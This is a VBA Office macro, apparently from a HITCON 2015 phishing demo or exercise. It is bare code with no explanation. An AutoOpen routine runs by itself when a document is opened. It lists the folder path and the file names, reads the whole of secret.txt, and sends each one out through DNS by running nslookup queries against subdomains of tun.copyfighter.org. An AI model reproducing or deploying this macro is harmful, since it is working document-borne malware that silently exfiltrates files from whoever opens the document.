Sub AutoOpen()
    Dim dirOutput
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    Dim objShell: Set objShell = CreateObject("WScript.Shell")

    strHex = ""
    strStr = Replace("Hello from Phish HITCON 2015", " ", "_")
    
    'Hexify ("Hello from HITCON 2015")
    
    'strCmd = "%comspec% /c nslookup " & strHex & ".tun.copyfighter.org"
    'objShell.Exec ("%comspec% /c nslookup tun.copyfighter.org")
    'objShell.Exec ("%comspec% /c nslookup " & strStr & ".tun.copyfighter.org")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    objStartFolder = "."

    Set objFolder = objFSO.GetFolder(objStartFolder)
    'Wscript.Echo objFolder.Path
    objShell.Exec ("%comspec% /c nslookup " & objFolder.Path & ".tun.copyfighter.org")

    Set colFiles = objFolder.Files
    buff = ""
    For Each objFile In colFiles
        buff = Replace(objFile.Name, " ", "_")
        buff = Replace(buff, ".", "_")
        objShell.Exec ("%comspec% /c nslookup " & buff & ".tun.copyfighter.org")
    Next
    
    secretname = objFolder.Path & "\secret.txt"
    Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(secretname, 1)
    buff = objFileToRead.ReadAll()
    objFileToRead.Close
    Set objFileToRead = Nothing

    objShell.Exec ("%comspec% /c nslookup " & buff & ".tun.copyfighter.org")
    
End Sub

